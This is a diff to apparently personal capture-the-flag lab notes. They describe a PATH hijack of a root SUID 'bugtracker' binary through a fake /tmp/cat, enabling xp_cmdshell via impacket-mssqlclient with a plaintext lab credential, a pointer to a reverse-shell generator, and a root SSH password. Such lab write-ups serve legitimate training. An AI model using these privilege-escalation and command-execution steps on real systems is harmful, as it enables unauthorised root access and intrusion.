@@ -140,7 +140,7 @@ find / -group bugtracker 2>/dev/null
 -> returns `/usr/bin/bugtracker` with a root suid.
 - running it and after inputting something, prompts a cat error, meaning that it execs cat
 
--
+-> we can replace the cat with a fake cat that spawns a interactive bash.
 
 ```bash
 # Make a temporary fake cat to overwrite the normal cat
@@ -152,6 +152,13 @@ chmod +x /tmp/cat
 # Put it in the env variables
 export PATH=/tmp:$PATH
 ```
+
+-> the `-p` option in `echo` helps preverse the effective UID rather than dropping privilege
+(VERY IMPORTANT)
+
+-> PATH determines where the system searches for executables when a command is called without an absolute path.
+
+-> run `/usr/bin/bugtracker` and become root!
 
 # Archetype
 
@@ -185,7 +192,12 @@ impacket-mssqlclient sql_svc:'M3g4c0rp123'@{IP_ADDRESS} -windows-auth
 #Enable xp_cmdshell first after login
 enable_xp_cmdshell
 xp_cmdshell whoami
+
 ```
+
+-> `xp_cmdshell` allows SQL server to execute operating system commands.
+*(compromised MSSQL account can potentially become an entry point to the machine)*
+
 
 -> https://www.revshells.com/ for generating reverse shell payload for a given situation (PS, bash, PHP, netcat, etc)
 
@@ -329,6 +341,5 @@ ssh {IP_ADDRESS} -l root
 # which is:
 -NotACrackablePassword4U2022-
 ```
-
 
 -> get the flag!
